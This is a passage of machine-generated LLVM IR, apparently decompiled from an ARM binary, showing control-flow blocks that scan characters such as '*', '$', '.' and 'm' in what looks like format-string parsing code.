dec_label_pc_154a8:                               ; preds = %dec_label_pc_15494
  %v0_154a8 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_154a8, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_154ac

dec_label_pc_154ac:                               ; preds = %bb147, %dec_label_pc_153e0, %dec_label_pc_1543c, %dec_label_pc_154a8
  %v1_154ec = phi i32 [ %v0_1547076, %dec_label_pc_154a8 ], [ %v0_15448, %bb147 ], [ %v0_15448, %dec_label_pc_1543c ], [ %v0_15448, %dec_label_pc_153e0 ]
  %v0_154e8 = phi i32 [ %v5_1546c, %dec_label_pc_154a8 ], [ %v0_153e0, %bb147 ], [ %v0_153e0, %dec_label_pc_1543c ], [ %v0_153e0, %dec_label_pc_153e0 ]
  %stack_var_-44.3 = phi i32 [ %stack_var_-44.2, %dec_label_pc_154a8 ], [ %stack_var_-44.1, %bb147 ], [ %stack_var_-44.1, %dec_label_pc_1543c ], [ %stack_var_-44.1, %dec_label_pc_153e0 ]
  %v1_154ac = inttoptr i32 %v0_154e8 to i8*
  %v2_154ac = load i8, i8* %v1_154ac, align 1
  %v3_154ac = zext i8 %v2_154ac to i32
  store i32 %v3_154ac, i32* %r3.global-to-local, align 4
  %v7_154b0 = icmp eq i8 %v2_154ac, 42
  br i1 %v7_154b0, label %dec_label_pc_154b8, label %dec_label_pc_154f8

dec_label_pc_154b8:                               ; preds = %dec_label_pc_154ac
  %v0_154b8 = load i32, i32* %fp.global-to-local, align 4
  %v2_154b8 = icmp eq i32 %v0_154b8, 0
  br i1 %v2_154b8, label %dec_label_pc_154e8, label %dec_label_pc_154c0

dec_label_pc_154c0:                               ; preds = %dec_label_pc_154b8
  %v1_154c0 = inttoptr i32 %v1_154ec to i8*
  %v2_154c0 = load i8, i8* %v1_154c0, align 1
  %v3_154c0 = zext i8 %v2_154c0 to i32
  store i32 %v3_154c0, i32* %r3.global-to-local, align 4
  %v7_154c4 = icmp eq i8 %v2_154c0, 36
  br i1 %v7_154c4, label %dec_label_pc_154cc, label %dec_label_pc_157e0

dec_label_pc_154cc:                               ; preds = %dec_label_pc_154c0
  %v0_154cc = load i32, i32* %r1.global-to-local, align 4
  %tmp148 = icmp slt i32 %v0_154cc, 1
  br i1 %tmp148, label %dec_label_pc_157e0, label %dec_label_pc_154d4

dec_label_pc_154d4:                               ; preds = %dec_label_pc_154cc
  %v0_154d8 = load i32, i32* %r8.global-to-local, align 4
  %v1_154d8 = load i32, i32* %sb.global-to-local, align 4
  %v3_154d8 = mul i32 %v1_154d8, %v0_154d8
  %v4_154d8 = add i32 %v3_154d8, %v3_1536c.pre-phi
  store i32 %v4_154d8, i32* %r3.global-to-local, align 4
  %v1_154dc = add i32 %v1_154ec, 1
  store i32 %v1_154dc, i32* %r6.global-to-local, align 4
  %v2_154e0 = add i32 %v4_154d8, -12
  %v3_154e0 = inttoptr i32 %v2_154e0 to i32*
  store i32 %v0_154cc, i32* %v3_154e0, align 4
  br label %dec_label_pc_154f4

dec_label_pc_154e8:                               ; preds = %dec_label_pc_154b8
  %v1_154e8 = add i32 %v0_154e8, 1
  store i32 %v1_154e8, i32* %r3.global-to-local, align 4
  %v9_154ec = icmp eq i32 %v1_154e8, %v1_154ec
  br i1 %v9_154ec, label %dec_label_pc_154f4, label %dec_label_pc_157e0

dec_label_pc_154f4:                               ; preds = %dec_label_pc_154e8, %dec_label_pc_154d4
  store i32 -2147483648, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_154f8

dec_label_pc_154f8:                               ; preds = %dec_label_pc_154ac, %dec_label_pc_154f4
  %v0_154f8 = load i32, i32* %r8.global-to-local, align 4
  %v2_154f8 = icmp eq i32 %v0_154f8, 0
  br i1 %v2_154f8, label %dec_label_pc_15504, label %dec_label_pc_15524.loopexit

dec_label_pc_15504:                               ; preds = %dec_label_pc_154f8
  %v0_15504 = load i32, i32* %r6.global-to-local, align 4
  %v1_15504 = inttoptr i32 %v0_15504 to i8*
  %v2_15504 = load i8, i8* %v1_15504, align 1
  %v3_15504 = zext i8 %v2_15504 to i32
  store i32 %v3_15504, i32* %r3.global-to-local, align 4
  %v7_15508 = icmp eq i8 %v2_15504, 46
  br i1 %v7_15508, label %.thread20, label %dec_label_pc_1551c

.thread20:                                        ; preds = %dec_label_pc_15504
  %v2_1550c = add i32 %v0_15504, 1
  store i32 %v2_1550c, i32* %r6.global-to-local, align 4
  %v1_15510 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v1_15510, i32* %sl.global-to-local, align 4
  store i32 -1, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_15360

dec_label_pc_1551c:                               ; preds = %dec_label_pc_15504
  %v0_1551c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_1551c, i32* %sl.global-to-local, align 4
  store i32 -1, i32* @r5, align 4
  br label %dec_label_pc_15524

dec_label_pc_15524.loopexit:                      ; preds = %dec_label_pc_154f8
  %v1_154fc = load i32, i32* %r1.global-to-local, align 4
  store i32 %v1_154fc, i32* @r5, align 4
  %v0_15530.pre.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_15524

dec_label_pc_15524:                               ; preds = %dec_label_pc_15524.loopexit, %dec_label_pc_1551c
  %v0_15530.pre = phi i32 [ %v0_15530.pre.pre, %dec_label_pc_15524.loopexit ], [ %v0_15504, %dec_label_pc_1551c ]
  store i32 -37196, i32* %r3.global-to-local, align 4
  %v0_15528 = load i32, i32* @lr, align 4
  %v2_15528 = add i32 %v0_15528, -37196
  store i32 %v2_15528, i32* %r1.global-to-local, align 4
  %v1_15530 = inttoptr i32 %v0_15530.pre to i8*
  br label %dec_label_pc_1552c

dec_label_pc_1552c:                               ; preds = %dec_label_pc_15540, %dec_label_pc_15524
  %v0_15540 = phi i32 [ %v1_15540, %dec_label_pc_15540 ], [ %v2_15528, %dec_label_pc_15524 ]
  %v1_1552c = inttoptr i32 %v0_15540 to i8*
  %v2_1552c = load i8, i8* %v1_1552c, align 1
  %v3_1552c = zext i8 %v2_1552c to i32
  store i32 %v3_1552c, i32* %r2.global-to-local, align 4
  %v2_15530 = load i8, i8* %v1_15530, align 1
  %v3_15530 = zext i8 %v2_15530 to i32
  store i32 %v3_15530, i32* %r3.global-to-local, align 4
  %v9_15534 = icmp eq i8 %v2_15530, %v2_1552c
  br i1 %v9_15534, label %bb149, label %dec_label_pc_15540

bb149:                                            ; preds = %dec_label_pc_1552c
  %v2_15538 = add i32 %v0_15530.pre, 1
  store i32 %v2_15538, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1554c

dec_label_pc_15540:                               ; preds = %dec_label_pc_1552c
  %v1_15540 = add i32 %v0_15540, 1
  %v2_15540 = inttoptr i32 %v1_15540 to i8*
  %v3_15540 = load i8, i8* %v2_15540, align 1
  %v4_15540 = zext i8 %v3_15540 to i32
  store i32 %v4_15540, i32* %r3.global-to-local, align 4
  store i32 %v1_15540, i32* %r1.global-to-local, align 4
  %v2_15544 = icmp eq i8 %v3_15540, 0
  br i1 %v2_15544, label %dec_label_pc_1554c, label %dec_label_pc_1552c

dec_label_pc_1554c:                               ; preds = %dec_label_pc_15540, %bb149
  %v1_15570 = phi i32 [ %v2_15538, %bb149 ], [ %v0_15530.pre, %dec_label_pc_15540 ]
  %v1_1556c = phi i32 [ %v0_15540, %bb149 ], [ %v1_15540, %dec_label_pc_15540 ]
  %v2_15554 = sub i32 %v1_1556c, %v2_15528
  store i32 %v2_15554, i32* %r3.global-to-local, align 4
  %v8_1555c = icmp sgt i32 %v2_15554, 1
  br i1 %v8_1555c, label %.thread24, label %dec_label_pc_15560

dec_label_pc_15560:                               ; preds = %dec_label_pc_1554c
  %v1_15560 = inttoptr i32 %v1_15570 to i8*
  %v2_15560 = load i8, i8* %v1_15560, align 1
  %v3_15560 = zext i8 %v2_15560 to i32
  store i32 %v3_15560, i32* %r2.global-to-local, align 4
  %v1_15564 = inttoptr i32 %v1_1556c to i8*
  %v2_15564 = load i8, i8* %v1_15564, align 1
  %v3_15564 = zext i8 %v2_15564 to i32
  store i32 %v3_15564, i32* %r3.global-to-local, align 4
  %v9_15568 = icmp eq i8 %v2_15560, %v2_15564
  br i1 %v9_15568, label %bb150, label %.thread24

bb150:                                            ; preds = %dec_label_pc_15560
  %v2_1556c = add i32 %v1_1556c, 9
  store i32 %v2_1556c, i32* %r1.global-to-local, align 4
  %v2_15570 = add i32 %v1_15570, 1
  store i32 %v2_15570, i32* %r6.global-to-local, align 4
  br label %.thread24

.thread24:                                        ; preds = %dec_label_pc_15560, %dec_label_pc_1554c, %bb150
  %v0_15578 = phi i32 [ %v1_1556c, %dec_label_pc_15560 ], [ %v1_1556c, %dec_label_pc_1554c ], [ %v2_1556c, %bb150 ]
  %v0_15574 = phi i32 [ %v1_15570, %dec_label_pc_15560 ], [ %v1_15570, %dec_label_pc_1554c ], [ %v2_15570, %bb150 ]
  %v1_15574 = inttoptr i32 %v0_15574 to i8*
  %v2_15574 = load i8, i8* %v1_15574, align 1
  %v3_15574 = zext i8 %v2_15574 to i32
  store i32 %v3_15574, i32* %r2.global-to-local, align 4
  %v1_15578 = add i32 %v0_15578, 9
  %v2_15578 = inttoptr i32 %v1_15578 to i8*
  %v3_15578 = load i8, i8* %v2_15578, align 1
  %v4_15578 = zext i8 %v3_15578 to i32
  store i32 %v4_15578, i32* %r3.global-to-local, align 4
  %v2_1557c = icmp eq i8 %v2_15574, 0
  %v3_15580 = mul nuw nsw i32 %v4_15578, 256
  store i32 %v3_15580, i32* @ip, align 4
  br i1 %v2_1557c, label %dec_label_pc_157e0, label %dec_label_pc_15588

dec_label_pc_15588:                               ; preds = %.thread24
  store i32 -37096, i32* %r3.global-to-local, align 4
  %v2_1558c = add i32 %v0_15528, -37096
  store i32 %v2_1558c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15590

dec_label_pc_15590:                               ; preds = %dec_label_pc_15614, %dec_label_pc_15588
  %v1_155a4 = phi i32 [ %v1_15614, %dec_label_pc_15614 ], [ %v2_1558c, %dec_label_pc_15588 ]
  %v1_15590 = inttoptr i32 %v1_155a4 to i8*
  %v2_15590 = load i8, i8* %v1_15590, align 1
  %v3_15590 = zext i8 %v2_15590 to i32
  store i32 %v3_15590, i32* %r3.global-to-local, align 4
  %v9_15594 = icmp eq i8 %v2_15590, %v2_15574
  br i1 %v9_15594, label %dec_label_pc_1559c, label %dec_label_pc_15614

dec_label_pc_1559c:                               ; preds = %dec_label_pc_15590
  store i32 %v2_1558c, i32* %r3.global-to-local, align 4
  %v2_155a4 = sub i32 %v1_155a4, %v2_1558c
  store i32 %v2_155a4, i32* %r1.global-to-local, align 4
  %v7_155ac = icmp slt i32 %v2_155a4, 18
  br i1 %v7_155ac, label %bb152, label %dec_label_pc_155b0

dec_label_pc_155b0:                               ; preds = %dec_label_pc_1559c
  %v1_155b0 = and i32 %v3_15580, 1024
  %v2_155b0 = icmp eq i32 %v1_155b0, 0
  br i1 %v2_155b0, label %bb152, label %bb151

bb151:                                            ; preds = %dec_label_pc_155b0
  %v2_155b4 = add i32 %v2_155a4, -2
  store i32 %v2_155b4, i32* %r1.global-to-local, align 4
  br label %bb152

bb152:                                            ; preds = %dec_label_pc_1559c, %dec_label_pc_155b0, %bb151
  %v0_155bc = phi i32 [ %v2_155a4, %dec_label_pc_1559c ], [ %v2_155a4, %dec_label_pc_155b0 ], [ %v2_155b4, %bb151 ]
  store i32 -37144, i32* %r3.global-to-local, align 4
  %v1_155bc = load i32, i32* %r7.global-to-local, align 4
  %v2_155bc = add i32 %v1_155bc, 32
  %v3_155bc = inttoptr i32 %v2_155bc to i32*
  store i32 %v0_155bc, i32* %v3_155bc, align 4
  %v0_155c0 = load i32, i32* @lr, align 4
  %v1_155c0 = load i32, i32* %r3.global-to-local, align 4
  %v2_155c0 = add i32 %v1_155c0, %v0_155c0
  store i32 %v2_155c0, i32* %r3.global-to-local, align 4
  %v1_155c4 = add i32 %v2_155c0, -1
  store i32 %v1_155c4, i32* %r0.global-to-local, align 4
  %v0_155cc.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_155c8

dec_label_pc_155c8:                               ; preds = %dec_label_pc_155c8, %bb152
  %v0_155c8 = phi i32 [ %v1_155c8, %dec_label_pc_155c8 ], [ %v1_155c4, %bb152 ]
  %v1_155c8 = add i32 %v0_155c8, 1
  %v2_155c8 = inttoptr i32 %v1_155c8 to i8*
  %v3_155c8 = load i8, i8* %v2_155c8, align 1
  %v4_155c8 = zext i8 %v3_155c8 to i32
  store i32 %v4_155c8, i32* %r3.global-to-local, align 4
  store i32 %v1_155c8, i32* %r0.global-to-local, align 4
  %v8_155d0 = icmp sgt i32 %v0_155cc.pre, %v4_155c8
  br i1 %v8_155d0, label %dec_label_pc_155c8, label %dec_label_pc_155d4

dec_label_pc_155d4:                               ; preds = %dec_label_pc_155c8
  %v2_155dc.neg = sub i32 37144, %v0_155c0
  %v2_155e0 = add i32 %v2_155dc.neg, %v1_155c8
  %v2_155e4 = mul i32 %v2_155e0, 2
  store i32 %v2_155e4, i32* %r2.global-to-local, align 4
  %v2_155e8 = add i32 %v0_155c0, -37160
  store i32 %v2_155e8, i32* %r3.global-to-local, align 4
  %v2_155ec = add i32 %v2_155e4, %v2_155e8
  %v3_155ec = inttoptr i32 %v2_155ec to i16*
  %v4_155ec = load i16, i16* %v3_155ec, align 2
  %v6_155ec = sext i16 %v4_155ec to i32
  store i32 %v6_155ec, i32* %r1.global-to-local, align 4
  %v2_155f4 = add i32 %v0_155c0, -37176
  store i32 %v2_155f4, i32* %r3.global-to-local, align 4
  %v2_155f8 = add i32 %v2_155e4, %v2_155f4
  %v3_155f8 = inttoptr i32 %v2_155f8 to i16*
  %v4_155f8 = load i16, i16* %v3_155f8, align 2
  %v6_155f8 = sext i16 %v4_155f8 to i32
  %v1_155fc = load i32, i32* @ip, align 4
  %v2_155fc = or i32 %v1_155fc, %v6_155ec
  %v2_15600 = and i32 %v2_155fc, %v6_155f8
  store i32 %v2_15600, i32* %r1.global-to-local, align 4
  store i32 -37096, i32* %r3.global-to-local, align 4
  %v2_15608 = add i32 %v0_155c0, -37096
  store i32 %v2_15608, i32* %r0.global-to-local, align 4
  store i32 %v2_15600, i32* %stack_var_-72, align 4
  %v0_1562c.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_15620

dec_label_pc_15614:                               ; preds = %dec_label_pc_15590
  %v1_15614 = add i32 %v1_155a4, 1
  %v2_15614 = inttoptr i32 %v1_15614 to i8*
  %v3_15614 = load i8, i8* %v2_15614, align 1
  %v4_15614 = zext i8 %v3_15614 to i32
  store i32 %v4_15614, i32* %r3.global-to-local, align 4
  store i32 %v1_15614, i32* %r0.global-to-local, align 4
  %v2_15618 = icmp eq i8 %v3_15614, 0
  br i1 %v2_15618, label %dec_label_pc_15620, label %dec_label_pc_15590

dec_label_pc_15620:                               ; preds = %dec_label_pc_15614, %dec_label_pc_155d4
  %v0_1562c = phi i32 [ %v0_1562c.pre, %dec_label_pc_155d4 ], [ %v0_15574, %dec_label_pc_15614 ]
  %v0_15628 = phi i32 [ %v1_155fc, %dec_label_pc_155d4 ], [ %v3_15580, %dec_label_pc_15614 ]
  %v0_15620 = load i32, i32* @r4, align 4
  %v1_15620 = and i32 %v0_15620, 4
  %v1_15624 = and i32 %v0_15620, -5
  store i32 %v1_15624, i32* %r3.global-to-local, align 4
  %v1_15628 = and i32 %v0_15628, 3840
  store i32 %v1_15628, i32* %r2.global-to-local, align 4
  %v1_1562c = inttoptr i32 %v0_1562c to i8*
  %v2_1562c = load i8, i8* %v1_1562c, align 1
  %v3_1562c = zext i8 %v2_1562c to i32
  store i32 %v3_1562c, i32* %r1.global-to-local, align 4
  %v2_15630 = or i32 %v1_15624, %v1_15628
  store i32 %v2_15630, i32* %r2.global-to-local, align 4
  %tmp180 = mul nuw nsw i32 %v1_15620, 4
  %tmp181 = or i32 %tmp180, 32
  %v1_1563c = load i32, i32* %r7.global-to-local, align 4
  %v2_1563c = add i32 %v1_1563c, 20
  %v3_1563c = inttoptr i32 %v2_1563c to i32*
  store i32 %tmp181, i32* %v3_1563c, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_15644 = load i32, i32* %r1.global-to-local, align 4
  %v1_15644 = load i32, i32* %r7.global-to-local, align 4
  %v2_15644 = add i32 %v1_15644, 12
  %v3_15644 = inttoptr i32 %v2_15644 to i32*
  store i32 %v0_15644, i32* %v3_15644, align 4
  %v0_15648 = load i32, i32* %r7.global-to-local, align 4
  %v1_15648 = add i32 %v0_15648, 4
  %v2_15648 = inttoptr i32 %v1_15648 to i32*
  %v3_15648 = load i32, i32* @r5, align 4
  store i32 %v3_15648, i32* %v2_15648, align 4
  %v4_15648 = add i32 %v0_15648, 8
  %v5_15648 = inttoptr i32 %v4_15648 to i32*
  %v6_15648 = load i32, i32* %sl.global-to-local, align 4
  store i32 %v6_15648, i32* %v5_15648, align 4
  %v0_1564c = load i32, i32* %r2.global-to-local, align 4
  %v1_1564c = load i32, i32* %r7.global-to-local, align 4
  %v2_1564c = add i32 %v1_1564c, 16
  %v3_1564c = inttoptr i32 %v2_1564c to i32*
  store i32 %v0_1564c, i32* %v3_1564c, align 4
  %v0_15650 = load i32, i32* %r3.global-to-local, align 4
  %v1_15650 = load i32, i32* %r7.global-to-local, align 4
  %v2_15650 = add i32 %v1_15650, 28
  %v3_15650 = inttoptr i32 %v2_15650 to i32*
  store i32 %v0_15650, i32* %v3_15650, align 4
  %v0_15654 = load i32, i32* %r0.global-to-local, align 4
  %v1_15654 = inttoptr i32 %v0_15654 to i8*
  %v2_15654 = load i8, i8* %v1_15654, align 1
  %v3_15654 = zext i8 %v2_15654 to i32
  store i32 %v3_15654, i32* %r2.global-to-local, align 4
  %v2_15658 = icmp eq i8 %v2_15654, 0
  br i1 %v2_15658, label %dec_label_pc_15660, label %dec_label_pc_156e4

dec_label_pc_15660:                               ; preds = %dec_label_pc_15620
  %v0_15660 = load i32, i32* %r6.global-to-local, align 4
  %v1_15660 = inttoptr i32 %v0_15660 to i8*
  %v2_15660 = load i8, i8* %v1_15660, align 1
  %v3_15660 = zext i8 %v2_15660 to i32
  store i32 %v3_15660, i32* %r3.global-to-local, align 4
  %v7_15664 = icmp eq i8 %v2_15660, 109
  br i1 %v7_15664, label %.thread28, label %dec_label_pc_15678

.thread28:                                        ; preds = %dec_label_pc_15660
  store i32 20, i32* %r3.global-to-local, align 4
  %v2_1566c = load i32, i32* %r7.global-to-local, align 4
  %v3_1566c = add i32 %v2_1566c, 32
  %v4_1566c = inttoptr i32 %v3_1566c to i32*
  store i32 20, i32* %v4_1566c, align 4
  %v1_15670 = load i32, i32* %r2.global-to-local, align 4
  %v2_15670 = load i32, i32* %r7.global-to-local, align 4
  %v3_15670 = add i32 %v2_15670, 28
  %v4_15670 = inttoptr i32 %v3_15670 to i32*
  store i32 %v1_15670, i32* %v4_15670, align 4
  br label %dec_label_pc_156e4

dec_label_pc_15678:                               ; preds = %dec_label_pc_15660
  store i32 860, i32* %r3.global-to-local, align 4
  %v0_1567c = load i32, i32* @lr, align 4
  %v2_1567c = add i32 %v0_1567c, 860
  %v3_1567c = inttoptr i32 %v2_1567c to i32*
  %v4_1567c = load i32, i32* %v3_1567c, align 4
  store i32 %v4_1567c, i32* %r1.global-to-local, align 4
  store i32 21, i32* %r3.global-to-local, align 4
  %v1_15684 = load i32, i32* %r7.global-to-local, align 4
  %v2_15684 = add i32 %v1_15684, 32
  %v3_15684 = inttoptr i32 %v2_15684 to i32*
  store i32 21, i32* %v3_15684, align 4
  %v0_15688 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_15688, i32* @ip, align 4
  %v1_1568c = add i32 %v0_15688, 10
  store i32 %v1_1568c, i32* %r0.global-to-local, align 4
  %v0_15694.pre = load i32, i32* %r6.global-to-local, align 4
  %v1_15694 = inttoptr i32 %v0_15694.pre to i8*
  br label %dec_label_pc_15690

dec_label_pc_15690:                               ; preds = %dec_label_pc_156d4, %dec_label_pc_15678
  %v1_156a0 = phi i32 [ %v1_156d4, %dec_label_pc_156d4 ], [ %v0_15688, %dec_label_pc_15678 ]
  %v1_15690 = inttoptr i32 %v1_156a0 to i8*
  %v2_15690 = load i8, i8* %v1_15690, align 1
  %v3_15690 = zext i8 %v2_15690 to i32
  store i32 %v3_15690, i32* %r2.global-to-local, align 4
  %v2_15694 = load i8, i8* %v1_15694, align 1
  %v3_15694 = zext i8 %v2_15694 to i32
  store i32 %v3_15694, i32* %r3.global-to-local, align 4
  %v9_15698 = icmp eq i8 %v2_15690, %v2_15694
  br i1 %v9_15698, label %dec_label_pc_156a0, label %dec_label_pc_156d4

dec_label_pc_156a0:                               ; preds = %dec_label_pc_15690
  %v2_156a0 = sub i32 %v1_156a0, %v0_15688
  store i32 %v2_156a0, i32* %r3.global-to-local, align 4
  %v0_156a8 = load i32, i32* %r7.global-to-local, align 4
  %v1_156a8 = add i32 %v0_156a8, 4
  store i32 %v1_156a8, i32* %r0.global-to-local, align 4
  %v0_156ac = load i32, i32* @lr, align 4
  %v2_156ac = add i32 %v0_156ac, 26364
  store i32 5, i32* %r1.global-to-local, align 4
  %v2_156b4 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_156b4, i32* %r2.global-to-local, align 4
  %v4_156b8 = mul i32 %v2_156a0, 4
  %v5_156b8 = add i32 %v2_156ac, %v4_156b8
  %v6_156b8 = inttoptr i32 %v5_156b8 to i32*
  %v7_156b8 = load i32, i32* %v6_156b8, align 4
  store i32 %v7_156b8, i32* @ip, align 4
  store i32 87748, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v7_156b8)
  %v0_156c4 = load i32, i32* %r0.global-to-local, align 4
  %v1_156c8 = load i32, i32* %r7.global-to-local, align 4
  %v2_156c8 = add i32 %v1_156c8, 28
  %v3_156c8 = inttoptr i32 %v2_156c8 to i32*
  store i32 %v0_156c4, i32* %v3_156c8, align 4
  %v7_156cc = icmp sgt i32 %v0_156c4, 5
  br i1 %v7_156cc, label %dec_label_pc_157e0, label %dec_label_pc_156e4

dec_label_pc_156d4:                               ; preds = %dec_label_pc_15690
  %v1_156d4 = add i32 %v1_156a0, 1
  store i32 %v1_156d4, i32* %r1.global-to-local, align 4
  %v3_156d8 = icmp ult i32 %v1_156d4, %v1_1568c
  br i1 %v3_156d8, label %dec_label_pc_15690, label %dec_label_pc_157e0

dec_label_pc_156e4:                               ; preds = %.thread28, %dec_label_pc_156a0, %dec_label_pc_15620
  %v0_156e4 = load i32, i32* %fp.global-to-local, align 4
  %tmp156 = icmp slt i32 %v0_156e4, 1
  br i1 %tmp156, label %dec_label_pc_15790, label %dec_label_pc_156ec

dec_label_pc_156ec:                               ; preds = %dec_label_pc_156e4
  store i32 0, i32* %r8.global-to-local, align 4
  %v9_15704 = add i32 %stack_var_-44.3, -2
  br label %dec_label_pc_156f0

dec_label_pc_156f0:                               ; preds = %dec_label_pc_15778, %dec_label_pc_156ec
  %v9_15710 = phi i32 [ 0, %dec_label_pc_156ec ], [ %v1_1577c, %dec_label_pc_15778 ]
  %v7_156f4 = icmp sgt i32 %v9_15710, 2
  br i1 %v7_156f4, label %.thread38, label %bb157

.thread38:                                        ; preds = %dec_label_pc_156f0
  store i32 %v9_15704, i32* %r3.global-to-local, align 4
  %v10_15710 = add i32 %v9_15710, %v9_15704
  store i32 %v10_15710, i32* %r1.global-to-local, align 4
  br label %bb158

bb157:                                            ; preds = %dec_label_pc_156f0
  store i32 %v3_1536c.pre-phi, i32* @ip, align 4
  %v12_156f8 = mul i32 %v9_15710, 4
  %v13_156f8 = add i32 %v12_156f8, %v3_1536c.pre-phi
  store i32 %v13_156f8, i32* %r3.global-to-local, align 4
  %v9_15700 = add i32 %v13_156f8, -12
  %v10_15700 = inttoptr i32 %v9_15700 to i8*
  %v11_15700 = load i8, i8* %v10_15700, align 4
  %v12_15700 = zext i8 %v11_15700 to i32
  store i32 %v12_15700, i32* %r2.global-to-local, align 4
  %v9_15708 = load i32, i32* %r7.global-to-local, align 4
  %v10_15708 = add i32 %v9_15708, %v9_15710
  store i32 %v10_15708, i32* %r3.global-to-local, align 4
  store i32 %v12_15700, i32* %r1.global-to-local, align 4
  %v11_15714 = add i32 %v10_15708, 36
  %v12_15714 = inttoptr i32 %v11_15714 to i8*
  store i8 %v11_15700, i8* %v12_15714, align 1
  %v0_15718.pre = load i32, i32* %r1.global-to-local, align 4
  br label %bb158

bb158:                                            ; preds = %.thread38, %bb157
  %v0_15738 = phi i32 [ %v10_15710, %.thread38 ], [ %v0_15718.pre, %bb157 ]
  %v1_15718 = load i32, i32* %fp.global-to-local, align 4
  %v2_15718 = sub i32 %v0_15738, %v1_15718
  %v4_15718 = xor i32 %v1_15718, %v0_15738
  %v5_15718 = xor i32 %v2_15718, %v0_15738
  %v6_15718 = and i32 %v5_15718, %v4_15718
  %v7_15718 = icmp slt i32 %v6_15718, 0
  %v8_15718 = icmp slt i32 %v2_15718, 0
  %v9_15718 = icmp eq i32 %v0_15738, %v1_15718
  %v3_1571c = xor i1 %v8_15718, %v7_15718
  %v4_1571c = or i1 %v9_15718, %v3_1571c
  br i1 %v4_1571c, label %dec_label_pc_1572c, label %dec_label_pc_15720

dec_label_pc_15720:                               ; preds = %bb158
  %v1_15720 = add i32 %v0_15738, -9
  %v3_15720 = sub i32 8, %v0_15738
  %v4_15720 = and i32 %v3_15720, %v0_15738
  %v5_15720 = icmp slt i32 %v4_15720, 0
  %v6_15720 = icmp slt i32 %v1_15720, 0
  %v7_15720 = icmp eq i32 %v0_15738, 9
  %v3_15724 = xor i1 %v6_15720, %v5_15720
  %v4_15724 = or i1 %v7_15720, %v3_15724
  br i1 %v4_15724, label %dec_label_pc_15728, label %dec_label_pc_157e0

dec_label_pc_15728:                               ; preds = %dec_label_pc_15720
  store i32 %v0_15738, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_1572c

dec_label_pc_1572c:                               ; preds = %bb158, %dec_label_pc_15728
  store i32 %v3_1536c.pre-phi, i32* @r2, align 4
  %v1_15730 = load i32, i32* %r8.global-to-local, align 4
  %v4_15730 = mul i32 %v1_15730, 4
  %v5_15730 = add i32 %v4_15730, %v3_1536c.pre-phi
  store i32 %v5_15730, i32* %sb.global-to-local, align 4
  %v1_15734 = add i32 %v5_15730, -40
  %v2_15734 = inttoptr i32 %v1_15734 to i32*
  %v3_15734 = load i32, i32* %v2_15734, align 4
  store i32 %v3_15734, i32* %r5.global-to-local, align 4
  %v1_15738 = add i32 %v0_15738, -1
  store i32 %v1_15738, i32* %r3.global-to-local, align 4
  %v0_1573c = load i32, i32* %r7.global-to-local, align 4
  %v4_1573c = mul i32 %v1_15738, 4
  %v5_1573c = add i32 %v0_1573c, %v4_1573c
  store i32 %v5_1573c, i32* %sl.global-to-local, align 4
  %v7_15740 = icmp eq i32 %v3_15734, 8
  %v1_15744 = add i32 %v5_1573c, 40
  %v2_15744 = inttoptr i32 %v1_15744 to i32*
  %v3_15744 = load i32, i32* %v2_15744, align 4
  store i32 %v3_15744, i32* @r0, align 4
  br i1 %v7_15740, label %dec_label_pc_15778, label %dec_label_pc_1574c

dec_label_pc_1574c:                               ; preds = %dec_label_pc_1572c
  %v9_1574c = icmp eq i32 %v3_15744, %v3_15734
  br i1 %v9_1574c, label %dec_label_pc_15770, label %bb159

bb159:                                            ; preds = %dec_label_pc_1574c
  %v8_15750 = icmp eq i32 %v3_15744, 8
  br i1 %v8_15750, label %dec_label_pc_15770, label %dec_label_pc_15758

dec_label_pc_15758:                               ; preds = %bb159
  %v0_15758 = call i32 @_promoted_size()
  %v0_15760 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_15760, i32* @r0, align 4
  %v0_15764 = call i32 @_promoted_size()
  store i32 %v0_15764, i32* %r0.global-to-local, align 4
  %v8_1576c = icmp sgt i32 %v0_15758, %v0_15764
  br i1 %v8_1576c, label %dec_label_pc_15778, label %dec_label_pc_15758.dec_label_pc_15770_crit_edge

dec_label_pc_15758.dec_label_pc_15770_crit_edge:  ; preds = %dec_label_pc_15758
  %v0_15770.pre = load i32, i32* %sb.global-to-local, align 4
  %v1_15774.pre = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_15770

dec_label_pc_15770:                               ; preds = %dec_label_pc_15758.dec_label_pc_15770_crit_edge, %dec_label_pc_1574c, %bb159
  %v1_15774 = phi i32 [ %v1_15774.pre, %dec_label_pc_15758.dec_label_pc_15770_crit_edge ], [ %v5_1573c, %dec_label_pc_1574c ], [ %v5_1573c, %bb159 ]
  %v0_15770 = phi i32 [ %v0_15770.pre, %dec_label_pc_15758.dec_label_pc_15770_crit_edge ], [ %v5_15730, %dec_label_pc_1574c ], [ %v5_15730, %bb159 ]
  %v1_15770 = add i32 %v0_15770, -40
  %v2_15770 = inttoptr i32 %v1_15770 to i32*
  %v3_15770 = load i32, i32* %v2_15770, align 4
  store i32 %v3_15770, i32* %r3.global-to-local, align 4
  %v2_15774 = add i32 %v1_15774, 40
  %v3_15774 = inttoptr i32 %v2_15774 to i32*
  store i32 %v3_15770, i32* %v3_15774, align 4
  br label %dec_label_pc_15778

dec_label_pc_15778:                               ; preds = %dec_label_pc_15758, %dec_label_pc_1572c, %dec_label_pc_15770
  %v0_15778 = load i32, i32* %r7.global-to-local, align 4
  %v1_15778 = add i32 %v0_15778, 28
  %v2_15778 = inttoptr i32 %v1_15778 to i32*
  %v3_15778 = load i32, i32* %v2_15778, align 4
  %v0_1577c = load i32, i32* %r8.global-to-local, align 4
  %v1_1577c = add i32 %v0_1577c, 1
  store i32 %v1_1577c, i32* %r8.global-to-local, align 4
  %v1_15780 = add i32 %v3_15778, 2
